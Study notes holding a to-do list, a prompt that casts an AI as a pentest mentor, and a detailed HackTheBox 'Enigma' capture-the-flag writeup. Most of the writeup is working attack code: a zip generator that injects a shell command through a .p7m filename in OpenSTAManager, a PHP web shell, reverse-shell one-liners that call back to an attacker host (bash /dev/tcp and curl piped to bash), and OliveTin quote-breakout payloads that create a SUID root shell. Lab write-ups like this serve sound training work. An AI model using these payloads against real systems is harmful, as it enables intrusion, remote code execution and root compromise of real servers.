- [ ] CLEAN UP TAGS
- [ ] Re-read all the files in the **Network Fundamentals** folder carefully — don’t skim this time as you move everything into [[NETWORKING FUNDAMENTALS]]
- [ ] Re-read all the files in the **Windows** folder carefully — don’t skim this time! 
- [ ] Create tags for TOOLS and LABS and delete the index notes respectively.
- [ ] Go through all older notes and replace **`#TOOLS`** tags with **`#[ToolName]`** tags (e.g., `#nmap`, `#wireshark`, etc.) to match your current tagging system. And add the changes to the [[00 TOOLS]] note.

- [ ] move files from the Metasploit folder to [[METASPLOIT FRAMEWORK]]
- [ ] Redo VULNERABILITY ASSESSSMENT
- [ ] Redo NETWORKING FUNDAMENTALS
- [ ] Redo WINDOWS


Read the attached writeup, then guide me through it interactively using the companion instructions below.

### Role

You are a senior penetration tester sitting next to a student who is actively working through an HTB machine. You have already read the attached writeup in full — that is your source of truth for what the correct path looks like. Your job is not to hand the student the answers, but to walk them through the engagement the way a real mentor would: giving just enough context to move forward, asking them what they see, and only explaining more when they're stuck or ask for it.

You speak in plain, direct language. You do not narrate what you're about to do — you just do it. You do not repeat information the student already has unless they ask.


### On startup

After reading the walkthrough, introduce the machine with the following — keep the whole intro under ten sentences:

**1. Challenge category.** Infer the primary category from the walkthrough and name it explicitly. Use the labels below and pick the one that best fits the dominant skill this machine tests. If it spans two meaningfully (e.g. web exploitation that pivots into a binary privesc), name both and say which comes first.

|Category|What it means|
|---|---|
|**Web exploitation**|The initial foothold is through a web app — SQLi, XSS, SSTI, file upload, IDOR, auth bypass, etc.|
|**Network / service exploitation**|Entry through a non-HTTP service — SMB, FTP, SSH misconfiguration, RPC, custom protocol, etc.|
|**CVE / known exploit**|A specific named vulnerability or public PoC against a versioned service drives the path|
|**Cryptography**|Breaking or bypassing a cipher, token, or encoding scheme is central to progress|
|**Reverse engineering**|A binary must be analyzed statically or dynamically to extract logic, credentials, or a flag|
|**Forensics / OSINT**|Files, logs, memory dumps, or open-source intelligence are the primary puzzle|
|**Password / hash cracking**|Credential recovery via brute force, hash cracking, or wordlist attacks is a key step|
|**Misconfiguration / privilege abuse**|The path relies on abused sudo rules, SUID binaries, weak permissions, or exposed credentials|
|**Active Directory**|The box involves AD enumeration, Kerberos attacks (AS-REP roasting, Kerberoasting), or domain lateral movement|
|**Pivoting / tunneling**|Progress requires moving through one host to reach another, using port forwarding or proxychains|

After naming the category, explain in one sentence why it fits — point to the concrete mechanism (e.g. "It's a CVE box because the foothold is a public exploit against a specific Apache version").

Then ask: **"Ready to start? I'll walk you through recon first."**

Wait for them to confirm before proceeding.


### Pacing — the core rule

**One step at a time. Always.**

After each step:

1. Tell the student the command to run (exact, copy-pasteable)
2. Ask them to run it and paste back the output (or tell you what they see)
3. Wait. Do not continue until they respond.

Never reveal the next step before they've completed and reported back on the current one.


### How to handle their output

When they paste output back:

- **If it matches what the walkthrough expects:** Confirm what it means in one or two sentences, then move to the next step.
- **If it's different but still valid:** Note the difference ("your scan shows port 8080 open too — we won't need it but good to note"), then continue.
- **If it's an error or unexpected result:** Diagnose it with them. Ask one focused question ("Did the VPN connect? Run `ip a` and check for a `tun0` interface"). Don't give up and skip ahead.
- **If they're stuck:** Give one targeted hint. If they're still stuck after that, give the next hint. Only explain the full answer if they ask directly or after two hints haven't unblocked them.


### Handling questions

The student may stop at any point and ask a question — about a command flag, a concept, why something works the way it does, or about CTF technique in general. When they do:

- Answer the question directly and concisely
- If it's a technique or concept question, give a short "theory block": what it is, why it matters here, and one real-world analogy if it helps
- After answering, bring them back to where they were: "Okay — back to the output you pasted. Here's what that tells us..."

Never skip their question to keep the pace. Questions are the point.


### Hints and spoilers

If the student asks for a hint:

- Give a nudge, not the answer: "Think about what version string Nmap returned — is that version known to be vulnerable to anything?"
- If they ask for a bigger hint: point them at the right tool or technique without giving the payload or exact command
- If they explicitly say "just tell me" or "I give up on this part": give the answer, explain why it works, and move on without judgment

Never volunteer a spoiler proactively. If the next step is "run gobuster", don't say "next we're going to brute-force directories" until they've reported back from the current step.


### Phase transitions

When moving between major phases (recon → enumeration → exploitation → privesc), pause and give a one-sentence summary of what was established in the phase just completed before moving into the next one. Example:

> "Good — recon is done. We know SSH is open on 22 and there's a web app on 80 running Apache 2.4.49. That version matters. Let's enumerate the web service now."


### When they find a flag

When they report finding `user.txt` or `root.txt`:

- Confirm it immediately and clearly: **"That's user! Well done."**
- Ask them to share the value so it's on record
- Give a one-sentence recap of how they got there
- Then move to the next phase (or close out if it's root)


### Closing out

When root is captured:

1. Confirm both flags are captured
2. Give a brief debrief — 3 to 5 bullet points on the attack chain, in plain language: what the entry point was, how they moved laterally (if applicable), and what the privesc mechanism was
3. Call back to the challenge category named at the start: confirm whether the box matched that expectation, and note if any phase felt like a different category (e.g. "The foothold was classic CVE exploitation like we said — but the privesc was really a misconfiguration abuse, which is worth recognising as a separate skill")
4. Ask if they have any questions about anything they encountered
5. Suggest one thing to explore further on their own, tied to the category — e.g. for a web box: "Try reproducing the SQLi manually in Burp without sqlmap"; for a CVE box: "Read the actual CVE advisory and understand what the vulnerable code path looks like"; for an AD box: "Look into BloodHound and map the attack path visually"


### Style rules

- Never start two consecutive sentences the same way
- No bullet walls — if you're explaining something with more than three bullets, fold it into prose
- Don't use phrases like "Great question!" or "Absolutely!" — just answer
- If you don't know something (outside the walkthrough), say so directly
- Keep everything grounded in what's actually in the walkthrough — don't invent alternative attack paths unless they specifically ask "is there another way?"

---

|                                                                |                                                                    |
| -------------------------------------------------------------- | ------------------------------------------------------------------ |
| NFS share enumeration, PDF credential leak                     | **Misconfiguration / Information Disclosure**                      |
| POP3/IMAP mailbox access, password reuse                       | **Credential Attacks / OSINT-style Enumeration**                   |
| OpenSTAManager file-upload RCE (CVE-2025-69212/CVE-2026-38751) | **Web Exploitation** (OS Command Injection)                        |
| Config file → DB dump → bcrypt crack                           | **Web Exploitation / Password Cracking**                           |
| OliveTin YAML templating injection → SUID root                 | **Privilege Escalation** (Command Injection / Local Service Abuse) |

---


# HackTheBox: Enigma Writeup (Detailed Guide)

**Difficulty:** Easy | **OS:** Linux

This guide provides a comprehensive, step-by-step walkthrough of the Enigma machine, including all scripts, alternative payloads, and intricate details required to complete the box from start to finish.

## Attack Chain Summary

1. **NFS Enumeration:** Mounted a world-readable NFS share (/srv/nfs/onboarding) to find a PDF containing initial employee webmail credentials (kevin).
2. **Mailbox Access:** Used POP3/IMAPS with Kevin's credentials. Discovered password reuse for the user sarah. Accessed Sarah's mailbox to extract administrative credentials for an internal OpenSTAManager instance.
3. **Exploitation (Foothold):** Exploited OS Command Injection (CVE-2025-69212 / CVE-2026-38751) via .p7m file uploads in OpenSTAManager to achieve a reverse shell as www-data.
4. **Lateral Movement:** Read the OpenSTAManager configuration file to extract MySQL database credentials. Dumped the zz_users table, extracted a bcrypt hash for haris, cracked it, and used su to switch users.
5. **Privilege Escalation:** Discovered a locally running OliveTin instance. Exploited an unauthenticated command injection vulnerability in a YAML-defined action (db_pass parameter) via the OliveTin API to spawn a SUID root bash binary.

## 1. Reconnaissance

We start with a comprehensive Nmap scan against the target IP to identify open ports and running services.

```
nmap -sC -sV -p- <TARGET_IP>
```

**Results:**

```
22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     nginx 1.24.0 (Ubuntu)
110/tcp  open  pop3     Dovecot pop3d
111/tcp  open  rpcbind  2-4 (RPC #100000)
143/tcp  open  imap     Dovecot imapd (Ubuntu)
993/tcp  open  ssl/imap Dovecot imapd (Ubuntu)
995/tcp  open  ssl/pop3 Dovecot pop3d
2049/tcp open  nfs_acl  3 (RPC #100227)
```

_Note: Add the base domain enigma.htb to your /etc/hosts file._

## NFS Enumeration

Port 2049 (NFS) and 111 (RPC) are open. We can check for available network mounts using showmount or nxc (NetExec). Let's mount the available onboarding directory to our local machine.

```
# Create a local mount point
mkdir -p /tmp/nfs_mount

# Mount the remote share
sudo mount -t nfs <TARGET_IP>:/srv/nfs/onboarding /tmp/nfs_mount -o nolock

# Inspect the contents
ls -la /tmp/nfs_mount/
```

---

Inside, we find a world-readable file named New_Employee_Access.pdf. We can read its contents directly in the terminal using pdftotext:

```
pdftotext /tmp/nfs_mount/New_Employee_Access.pdf -
```

**Extracted PDF Content:**

```
Enigma Corp
IT Department - New Employee System Access
Employee: Kevin Mitchell
Department: Operations
Provisioned by: IT Department
Date: 2024-03-01

Webmail Access
URL: http://mail001.enigma.htb
Username: kevin
Password: Enigma2024!
```

_Action: Add mail001.enigma.htb to /etc/hosts._

## 2. Mailbox Enumeration & Credential Gathering

We have credentials for kevin (Enigma2024!). The Nmap scan showed POP3 (110, 995) and IMAP (143, 993) are open.

Through standard credential testing, we discover a **password reuse vulnerability**: the password Enigma2024! also works for the user sarah.

We can interact directly with the POP3 SSL service using openssl to read Sarah's emails:

```
openssl s_client -connect enigma.htb:995 -quiet << 'EOF'
USER sarah
PASS Enigma2024!
LIST
RETR 1
QUIT
EOF
```

**Email Contents (RETR 1):**

```
Hi Sarah,
Apologies for the delay. I have provisioned your access. Please find the details below:

URL: http://support_001.enigma.htb
Username: admin
Password: Ne3s4rtars78s
```

_Action: Add support_001.enigma.htb to /etc/hosts._

---

_(Image 3: Screenshot of OpenSTAManager dashboard at http://support_001.enigma.htb/controller.php?id_module=1, logged in as admin, showing the calendar view for Jun 21–27, 2026.)_

_(Image 4: Screenshot of OpenSTAManager Sales Invoices > Importazione FE page at localhost:8081, showing a file upload field with "FINAL_WEBSHELL.zip" selected and a "Carica documenti" button highlighted.)_

---

## 3. Web Exploitation (Foothold)

Navigating to http://support_001.enigma.htb reveals an instance of **OpenSTAManager**.

Researching this application reveals a critical OS Command Injection vulnerability in the P7M (signed XML) file decoding functionality (tracked as CVE-2025-69212 / GHSA-25fp-8w8p-mx36, and associated with CVE-2026-38751).

- **Vulnerability Context:** The app allows uploading ZIP files containing .p7m files for invoice processing. The filename of the .p7m file is not properly sanitized before being passed to a system command, leading to RCE.
- **Public PoC Reference:** https://raw.githubusercontent.com/XiaomingX/data-cve-poc-py-v1/387f205cf558fb83953419e852e2d845da2adb13/2026/CVE-2026-38751/poc.py

### Step 3.1: Creating the Malicious Payload

We use a Python script to generate a ZIP file (exploit.zip). The ZIP contains a dummy file, but its _filename_ contains our injected shell command. This command will write a PHP web shell (SHELL.php) into the accessible files directory.

Create exploit_gen.py:

```python
import zipfile

# The command writes a simple PHP passthru shell
cmd = 'cd files && echo \'<?php system($_GET["c"]); ?>\' > SHELL.php'

# Injecting the command into the filename
malicious_filename = f'invoice.p7m";{cmd};echo ".p7m'

with zipfile.ZipFile('exploit.zip', 'w') as zf:
    zf.writestr(malicious_filename, b"DUMMY_P7M_CONTENT")

print("[+] exploit.zip created")
```

Run it: `python3 exploit_gen.py`

### Step 3.2: Uploading the Payload via cURL

We can automate the login and upload process using curl. We log in as admin (using the credentials found in Sarah's email) and save the session cookie, then upload the ZIP to the "Sales Invoices -> Importazione FE" module.

```bash
# 1. Login and save cookies
curl -c cookies.txt -b cookies.txt -X POST \
  -d "username=admin&password=Ne3s4rtars78s" \
  http://support_001.enigma.htb/?op=login

# 2. Upload the exploit.zip
curl -X POST -b cookies.txt \
  -F "blob1=@exploit.zip" \
  -F "op=save" \
  -F "id_module=14" \
  -F "id_plugin=48" \
  "http://support_001.enigma.htb/actions.php"
```

### Step 3.3: Getting a Reverse Shell

First, verify the shell was created successfully:

```
curl "http://support_001.enigma.htb/files/SHELL.php?c=id"
# Output should be: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Now, establish a reverse shell. Depending on the target environment, URL encoding issues can cause payloads to fail. Here are three highly reliable methods discussed during the exploitation phase. Start your netcat listener first: `nc -lvnp 4444`.

**Method A: Base64 Encoded Payload (Most Reliable)**

```bash
# Generate the base64 payload locally:
echo 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1' | base64 -w0
# Example Output: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMjMvNDQ0NCAwPiYx

# Execute via cURL:
curl --data-urlencode "c=echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMjMvNDQ0NCAwPiYx|base64 -d|bash" \
"http://support_001.enigma.htb/files/SHELL.php"
```

**Method B: URL Encoded Bash**

```
curl "http://support_001.enigma.htb/files/SHELL.php?c=bash+-c+'bash+-i+>%26+/dev/tcp/<YOUR_IP>/4444+0>%261'"
```

**Method C: Hosting a shell script locally**

```bash
# On your machine, create shell.sh with your reverse shell payload
# Start a python web server: python3 -m http.server 8000
curl \
"http://support_001.enigma.htb/files/SHELL.php?c=curl%20http%3A%2F%2F<YOUR_IP>%3A8000%2Fshell.sh%7Cbash"
```

You should now have an interactive shell as www-data.

## 4. Lateral Movement to haris

As www-data, we enumerate the OpenSTAManager web directory (/var/www/html/openstamanager or similar). Reading the configuration file reveals MySQL database credentials.

```
cat config.inc.php
# Found: DB User: brollin | DB Pass: Fri3nds@9099
```

We log into the MySQL database to dump user credentials from the zz_users table:

```
mysql -u brollin -p'Fri3nds@9099' -e "use openstamanager; select * from zz_users;" 2>/dev/null
```

We retrieve the following bcrypt hash for the user haris:

```
$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC
```

Save this hash to a file named hash.txt on your attacking machine and crack it using hashcat and the rockyou wordlist:

```
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

---

**Cracked Password:** bestfriends

Back in our www-data reverse shell, we simply switch to the haris user:

```
su haris
# Enter password: bestfriends
```

You are now haris. Grab the user.txt flag!

## 5. Privilege Escalation to root

Running a local network scan or checking running processes reveals a service called **OliveTin** running on local port 1337. OliveTin is a web interface for safely executing predefined shell commands.

### Investigating OliveTin

We can find the API endpoints and binary information by checking strings on the binary:

```
strings /usr/local/bin/OliveTin | grep -i "action_id\|binding"
```

Official documentation (https://docs.olivetin.app/api/method_StartActionByGetAndWait.html) confirms the existence of API endpoints like StartActionAndWait.

Checking the OliveTin configuration file at /etc/OliveTin/config.yaml:

```yaml
- title: Backup Database
  id: backup_database
  shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
```

The application is configured with authRequireGuestsToLogin: false and exec: true, meaning unauthenticated guests can execute this predefined action.

### The Vulnerability (Command Injection)

Look closely at how the db_pass variable is interpolated: `-p'{{ db_pass }}'`.

Because it is placed directly inside single quotes without sanitization, we can break out of the string using a single quote ('), append a semicolon (;) to end the mysqldump command, inject our own malicious command, and comment out the rest of the line with a hash (#).

**Payload Structure:** `x' ; <COMMAND> ; #`

### Exploitation Scripts

We will use curl to send a JSON POST request to the OliveTin local API, triggering the action and injecting our payload.

**Method 1: SUID Bash (Interactive Root Shell)**

This payload copies /bin/bash to /tmp and sets the SUID bit, allowing us to drop into a root shell.

```bash
curl -s -X POST "http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartActionAndWait" \
  -H "Content-Type: application/json" \
  -d '{
    "actionId": "backup_database",
    "arguments": [
      {"name": "db_user", "value": "backup_svc"},
      {"name": "db_pass", "value": "x\' ; cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash ; #"},
      {"name": "db_name", "value": "production"}
    ]
  }'
```

Once the command finishes, execute the SUID binary:

```
/tmp/rootbash -p
id
# uid=0(root) gid=1000(haris) euid=0(root)
```

**Method 2: Direct Flag Read**

If you just want to grab the flag quickly without an interactive shell, you can inject a cat command:

```bash
curl -s -X POST \
  -H "Content-Type: application/json" \
  -d '{"actionId": "backup_database", "arguments": [
    {"name": "db_user", "value": "backup_svc"},
    {"name": "db_pass", "value": "x\' ; cat /root/root.txt > /tmp/flag.txt ; #"},
    {"name": "db_name", "value": "production"}
  ]}' \
  http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartActionAndWait

cat /tmp/flag.txt
```

**System fully compromised!**





